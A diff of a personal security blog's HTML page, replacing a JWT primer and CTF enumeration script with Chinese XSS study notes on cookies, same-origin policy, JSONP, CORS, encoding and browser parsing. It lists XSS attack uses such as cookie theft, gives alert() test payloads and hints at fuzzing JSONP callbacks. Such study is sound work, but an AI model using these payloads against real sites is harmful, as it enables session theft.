@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="jwt基础知识">
+<meta name="description" content="0x00 用途盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集ajax get current page dataget gateway infoall linkscookiesteal login info 0x01 验证  12&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;img src=1 oneerro=alert(2)&amp;gt;">
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="jwt">
-<meta property="og:url" content="https://Horizoncy.github.io/2019/12/25/jwt/index.html">
+<meta property="og:title" content="XSS学习笔记">
+<meta property="og:url" content="https://Horizoncy.github.io/2020/07/28/XSS学习笔记/index.html">
 <meta property="og:site_name" content="Horizon&#39;s Security Notes">
-<meta property="og:description" content="jwt基础知识">
+<meta property="og:description" content="0x00 用途盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集ajax get current page dataget gateway infoall linkscookiesteal login info 0x01 验证  12&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;img src=1 oneerro=alert(2)&amp;gt;">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-25T10:59:27.961Z">
+<meta property="og:updated_time" content="2020-08-02T13:52:43.147Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="jwt">
-<meta name="twitter:description" content="jwt基础知识">
+<meta name="twitter:title" content="XSS学习笔记">
+<meta name="twitter:description" content="0x00 用途盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集ajax get current page dataget gateway infoall linkscookiesteal login info 0x01 验证  12&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;img src=1 oneerro=alert(2)&amp;gt;">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://Horizoncy.github.io/2019/12/25/jwt/">
+  <link rel="canonical" href="https://Horizoncy.github.io/2020/07/28/XSS学习笔记/">
 
 
 
 
 
-  <title>jwt | Horizon's Security Notes</title>
+  <title>XSS学习笔记 | Horizon's Security Notes</title>
   
 
 
@@ -285,7 +285,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://Horizoncy.github.io/2019/12/25/jwt/">
+    <link itemprop="mainEntityOfPage" href="https://Horizoncy.github.io/2020/07/28/XSS学习笔记/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Horizon">
@@ -302,7 +302,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">jwt</h1>
+          <h1 class="post-title" itemprop="name headline">XSS学习笔记</h1>
         
 
         <div class="post-meta">
@@ -314,8 +314,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-25T18:02:12+08:00">
-                2019-12-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-28T11:53:20+08:00">
+                2020-07-28
               </time>
             
 
@@ -346,7 +346,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  938
+                  3.5k
                 </span>
               
 
@@ -362,7 +362,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  14
                 </span>
               
             </div>
@@ -383,45 +383,115 @@
       
 
       
-        <h1 id="jwt基础知识"><a href="#jwt基础知识" class="headerlink" title="jwt基础知识"></a>jwt基础知识</h1><a id="more"></a>
-<h2 id="JSON-web-token是什么"><a href="#JSON-web-token是什么" class="headerlink" title="JSON web token是什么"></a>JSON web token是什么</h2><ul>
-<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<h2 id="什么时候你应该用JSON-Web-Tokens"><a href="#什么时候你应该用JSON-Web-Tokens" class="headerlink" title="什么时候你应该用JSON Web Tokens"></a>什么时候你应该用JSON Web Tokens</h2>下列场景中使用JSON Web Token是很有用的：</li>
-<li>Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
-<li>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。<h2 id="JSON-Web-Token的结构是什么样的"><a href="#JSON-Web-Token的结构是什么样的" class="headerlink" title="JSON Web Token的结构是什么样的"></a>JSON Web Token的结构是什么样的</h2></li>
-<li>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：1.Header</li>
-</ul>
-<p>2.Payload<br>3.Signature.</p>
+        <h1 id="0x00-用途"><a href="#0x00-用途" class="headerlink" title="0x00 用途"></a>0x00 用途</h1><h1 id="盗取cookie信息-水坑探针-挖矿-蠕虫-沙盒逃逸-代理-信息收集"><a href="#盗取cookie信息-水坑探针-挖矿-蠕虫-沙盒逃逸-代理-信息收集" class="headerlink" title="盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集"></a>盗取cookie信息 水坑探针 挖矿 蠕虫 沙盒逃逸 代理 信息收集</h1><p>ajax get current page data<br>get gateway info<br>all links<br>cookie<br>steal login info 0x01 验证 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt; </span><br><span class="line">&lt;img src=1 oneerro=alert(2)&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="confirm-console-log-0x02-cookie"><a href="#confirm-console-log-0x02-cookie" class="headerlink" title="confirm console.log 0x02 cookie"></a>confirm console.log 0x02 cookie</h1><p>http头Set-Cookie在浏览器中设置cookie<br>再次请求时，request便会携带cookie<br>以文本形式存放在浏览器目录下：%APPDATA%\Microsoft\Windows\Cookies<br>发起http请求时，浏览器会检查是否有相应cookie，有着将相应的cookie添加到请求头<br>获取cookie值：document.cookie（只能获取非httponly的值）<br>格式；key=value。两组之间以:[ ]隔开。<br>cookie属性：expires、domain、 path、secure、HttpOnly。<br>过期时间，域名+路径=url符合发送cookie。<br>ps： <strong>xhr请求：浏览器不会自动添加cookie。</strong> </p>
+<p>ps： domain可以设置本域和父域。 </p>
+<h1 id="secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。"><a href="#secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。" class="headerlink" title="secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。"></a>secure是在安全环境下才会将cookie进行发送，比如https。证书要被认可。</h1><p>js无法设置，也无法获取httponly的cookie。 0x03 同源策 略SOP </p>
+<p>cookie是 仅以domain/path作为同源限制 ，端口和协议不限制。 </p>
+<p>web则要求：协议相同，端口相同，域名相同。 http ： //<a href="http://www.bank.com：8080，https：//www.bank.com（以上为非同源）" target="_blank" rel="noopener">www.bank.com：8080，https：//www.bank.com（以上为非同源）</a> 。 </p>
+<p>web不同源的 影响：1.cookie，localstorage和indexdb无法读取。2.ajax请求无法发送。3.DOM无法获得。 <strong>所以path是向下通配的，比如path=/以下的cookie是一样的。domain是向上通配的（子域可以写cookie到父域）</strong> <strong>，比如 <a href="http://www.baidu.xxxx.com" target="_blank" rel="noopener">www.baidu.xxxx.com</a> 可以设置cookie的domain为 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong> <strong>。</strong> </p>
+<h1 id="0x04-cookie操作"><a href="#0x04-cookie操作" class="headerlink" title="0x04 cookie操作"></a>0x04 cookie操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务端 增加cookie 代码</span><br><span class="line">setcookie(&quot;TestCookie&quot;,&quot;$value,time()+3600,&quot; path &quot;,&quot; domain &quot;,true,false) </span><br><span class="line">客户端新增cookie</span><br><span class="line">document.cookie =&quot;a=1;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>除了httponly，都可以设置（https下才能设置secure） js代码设置cookie: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var exp = new Date（）； </span><br><span class="line">exp.setTime（exp.getTime（）+Days*24*60*60）； </span><br><span class="line">document.cookie = name+ &apos;=&apos; + escape(value) + &quot;;expires&quot;+exp.toGMTString()+&quot;domain=s.com; path=/&quot;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="修改cookie：直接赋值即可，但是要注意path-domain的一致性，否则不会修改，而是添加一个新cookie。"><a href="#修改cookie：直接赋值即可，但是要注意path-domain的一致性，否则不会修改，而是添加一个新cookie。" class="headerlink" title="修改cookie：直接赋值即可，但是要注意path/domain的一致性，否则不会修改，而是添加一个新cookie。"></a>修改cookie：直接赋值即可，但是要注意path/domain的一致性，否则不会修改，而是添加一个新cookie。</h1><p>删除cookie：设置过期时间为过去即可， 注意path/domain 。 0x05c ookie重名问题 </p>
+<p>server语言/框架：php，asp/.net,java/spring,nodejs,golang,python取前者，python取后者。<br>js库/框架：Jquery，Angularjs，Extjs，取前者，YUI取后者。<br>规则： <strong>1.更长path的cookie更靠前。</strong> </p>
+<p><strong>2.如果path长度相等，更早创建的cookie更靠前。</strong> </p>
+<p><em>ps：</em> <em>cookie简单编码：escape/unescape，encodeURIComponent/decodeURIComponent</em> <em>(用于传送cookie)。</em> </p>
+<h1 id="0x06-xss基础"><a href="#0x06-xss基础" class="headerlink" title="0x06 xss基础"></a>0x06 xss基础</h1><h1 id="反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。"><a href="#反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。" class="headerlink" title="反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。"></a>反射型：恶意代码存在于url中。点击才会触发，隐蔽性较差。</h1><p>存储型：恶意代码存储于数据库中，浏览被植入payload的页面时即可触发，隐蔽性强，成功率高，稳定性好。<br>DOM型：（DOM树状模型）js动态修改DOM时造成的XSS。 0x07 合法跨域请求 </p>
+<h2 id="1-JSONP"><a href="#1-JSONP" class="headerlink" title="1.JSONP"></a>1.JSONP</h2><p>（1）跨域请求过程 </p>
+<p>首先，网页动态插入<script>元素，由它向跨源网址发出请求。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function addScriptTag(src) &#123; </span><br><span class="line">  var script = document.createElement(&apos;script&apos;); </span><br><span class="line">  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;); </span><br><span class="line">  script.src = src; </span><br><span class="line">  document.body.appendChild(script); </span><br><span class="line">&#125; </span><br><span class="line">window.onload = function () &#123; </span><br><span class="line">  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;); </span><br><span class="line">&#125; </span><br><span class="line">function foo(data) &#123; </span><br><span class="line">  console.log(&apos;Your public IP address is: &apos; + data.ip); </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码通过动态添加<script>元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。<br>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> foo(&#123; </span><br><span class="line">  &quot;ip&quot;: &quot;8.8.8.8&quot; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+<p>（2）JSONP劫持=》referer验证。 </p>
+<p>（3）content-type 返回为html/txt 。 </p>
+<p>（4）JSONP挖掘 （ http fuzz ） ：http参数不过增删改查。一次性发 包 cb=1&callback=2&jsnop=3&call=4 （jsonp只支持get请求）。 </p>
+<h2 id="2-Websocket"><a href="#2-Websocket" class="headerlink" title="2.Websocket"></a>2.Websocket</h2><h2 id="3-CORS"><a href="#3-CORS" class="headerlink" title="3.CORS"></a>3.CORS</h2><p>只要服务器实现了CORS接口，就可以跨源通信。 </p>
+<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 </p>
+<h3 id="（1）简单请求"><a href="#（1）简单请求" class="headerlink" title="（1）简单请求"></a>（1）简单请求</h3><h4 id="1-满足条件"><a href="#1-满足条件" class="headerlink" title="1.满足条件"></a>1.满足条件</h4><p>只要同时满足以下两大条件，就属于简单请求。 </p>
+<p>（1) 请求方法是以下三种方法之一：HEAD，GET，POST。 </p>
+<p>（2）HTTP的头信息不超出以下几种字段： </p>
 <ul>
-<li>因此，一个典型的JWT看起来是这个样子的：<code>xxxxx.yyyyy.zzzzz</code><br>接下来看一下每一部分:</li>
-<li>header<br>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。<br>例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<li>Accept </li>
+<li>Accept-Language </li>
+<li>Content-Language </li>
+<li>Last-Event-ID </li>
+<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain <h4 id="2-基本流程"><a href="#2-基本流程" class="headerlink" title="2.基本流程"></a>2.基本流程</h4></li>
+</ul>
+<p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。 </p>
+<p>下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /cors HTTP/1.1 </span><br><span class="line">Origin: http://api.bob.com </span><br><span class="line">Host: api.alice.com </span><br><span class="line">Accept-Language: en-US </span><br><span class="line">Connection: keep-alive </span><br><span class="line">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>
+
+<p>上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。<br>如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 </p>
+<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com </span><br><span class="line">Access-Control-Allow-Credentials: true </span><br><span class="line">Access-Control-Expose-Headers: FooBar </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
+
+<p>上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。<br>（1）Access-Control-Allow-Origin </p>
+<p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个<em>，表示接受任意域名的请求。 *</em>需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。** </p>
+<p>（2）Access-Control-Allow-Credentials </p>
+<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 <strong>如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。另一方面，开发者必须在AJAX请求中打开withCredentials属性。否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。</strong>  <strong>同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</strong> </p>
+<p>（3）Access-Control-Expose-Headers </p>
+<p>该字段可选。 <strong>CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。</strong> 如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。 </p>
+<h3 id="（2）非简单请求"><a href="#（2）非简单请求" class="headerlink" title="（2）非简单请求"></a>（2）非简单请求</h3><h4 id="1-预检请求"><a href="#1-预检请求" class="headerlink" title="1.预检请求"></a>1.预检请求</h4><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。 </p>
+<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求。 </p>
+<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">下面是一段浏览器的JavaScript脚本。 </span><br><span class="line">var url = &apos;http://api.alice.com/cors&apos;; </span><br><span class="line">var xhr = new XMLHttpRequest(); </span><br><span class="line">xhr.open(&apos;PUT&apos;, url, true); </span><br><span class="line">xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;); </span><br><span class="line">xhr.send(); </span><br><span class="line">上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。 </span><br><span class="line"></span><br><span class="line">浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。 </span><br><span class="line">OPTIONS /cors HTTP/1.1 </span><br><span class="line">Origin: http://api.bob.com </span><br><span class="line">Access-Control-Request-Method: PUT </span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header </span><br><span class="line">Host: api.alice.com </span><br><span class="line">Accept-Language: en-US </span><br><span class="line">Connection: keep-alive </span><br><span class="line">User-Agent: Mozilla/5.0... </span><br><span class="line">&quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</span><br></pre></td></tr></table></figure>
+
+<p>除了Origin字段，"预检"请求的头信息包括两个特殊字段。<br>（1）Access-Control-Request-Method </p>
+<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 </p>
+<p>（2）Access-Control-Request-Headers </p>
+<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 </p>
+<h4 id="2-预检请求的回应"><a href="#2-预检请求的回应" class="headerlink" title="2.预检请求的回应"></a>2.预检请求的回应</h4><p>服务器收到"预检"请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT </span><br><span class="line">Server: Apache/2.0.61 (Unix) </span><br><span class="line">Access-Control-Allow-Origin: http://api.bob.com </span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT </span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header </span><br><span class="line">Content-Type: text/html; charset=utf-8 </span><br><span class="line">Content-Encoding: gzip </span><br><span class="line">Content-Length: 0 </span><br><span class="line">Keep-Alive: timeout=2, max=100 </span><br><span class="line">Connection: Keep-Alive </span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure>
+
+<p>上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示<a href="http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。">http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器否定了"预检"请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XMLHttpRequest cannot load http://api.alice.com. </span><br><span class="line">Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>
+
+<p>服务器回应的其他CORS相关字段如下。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: GET, POST, PUT </span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header </span><br><span class="line">Access-Control-Allow-Credentials: true </span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>
+
+<p>（1）Access-Control-Allow-Methods<br>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。 <strong>注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次"预检"请求。</strong> </p>
+<p>（2）Access-Control-Allow-Headers </p>
+<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。 <strong>它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在"预检"中请求的字段。</strong> </p>
+<p>（3）Access-Control-Allow-Credentials </p>
+<p>该字段与简单请求时的含义相同。 </p>
+<p>（4）Access-Control-Max-Age </p>
+<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 </p>
+<h3 id="（3）-浏览器的正常请求和回应"><a href="#（3）-浏览器的正常请求和回应" class="headerlink" title="（3） 浏览器的正常请求和回应"></a>（3） 浏览器的正常请求和回应</h3><p>一旦服务器通过了"预检"请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 </p>
+<p>下面是"预检"请求之后，浏览器的正常CORS请求。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /cors HTTP/1.1 </span><br><span class="line">Origin: http://api.bob.com </span><br><span class="line">Host: api.alice.com </span><br><span class="line">X-Custom-Header: value </span><br><span class="line">Accept-Language: en-US </span><br><span class="line">Connection: keep-alive </span><br><span class="line">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>
+
+<p>上面头信息的Origin字段是浏览器自动添加的。<br>下面是服务器正常的回应。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
+
+<p>上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。 </p>
+<h1 id="0x08-xss编码"><a href="#0x08-xss编码" class="headerlink" title="0x08 xss编码"></a>0x08 xss编码</h1><p>html编码：&#xH（16进制编码），&#D（10进制）（&#后可以任意加0）<br>html实体编码：&#039，&#x27。(html自动解码) </p>
+<h1 id="js编码：Unicode，16进制编码，转义。（js里自动解码）-0x09-浏览器解析"><a href="#js编码：Unicode，16进制编码，转义。（js里自动解码）-0x09-浏览器解析" class="headerlink" title="js编码：Unicode，16进制编码，转义。（js里自动解码） 0x09 浏览器解析"></a>js编码：Unicode，16进制编码，转义。（js里自动解码） 0x09 浏览器解析</h1><ul>
+<li>请求html==》解析html==》构建DOM树==》构建render树==》绘制render树。<br>html解析器</li>
+</ul>
+<p>1.五类元素<br>空元素：<area>，<br>，<base>等  不用容纳内容 </p>
+<ul>
+<li>原始文本元素：<script>，<style>等  可以容纳文本。 </li>
+<li>RCDATA元素：<textarea>，<title>等   可以容纳文本和字符引用。 </li>
+<li>外部元素：例如MathML命名空间或SVG命名空间的元素    可以容纳文本、字符引用、CDATA段。 </li>
+<li>基本元素：除了以上的元素 可以容纳文本，字符引用，其他元素和注释。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.编解码 **js中单引号双引号和圆括号属于控制字符，编码后无法识别。对于防御来说，可以编码控制字符。** 3.url编解码 顺序 &lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p>然后，用Base64对这个JSON编码就得到JWT的第一部分.</p>
-<ul>
-<li>Payload<br>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</li>
-</ul>
-<p>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>Public claims : 可以随意定义。<br>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>下面是一个例子:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;:&quot;1234567890&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;John Doe&quot;,</span><br><span class="line">    &quot;admin&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对payload进行Base64编码就得到JWT的第二部分</p>
-<p>注意，不要在JWT的payload或header中放置敏感信息，除非他们是加密的.</p>
-<ul>
-<li>Signature<br>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="BUUCTF-ikun"><a href="#BUUCTF-ikun" class="headerlink" title="BUUCTF ikun"></a>BUUCTF ikun</h1><ul>
-<li>第一步提示我们要找到lv6<br>写个脚本找一下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://web44.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,2000):</span><br><span class="line"></span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	if &apos;lv6.png&apos; in r.text:</span><br><span class="line">		print (i)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
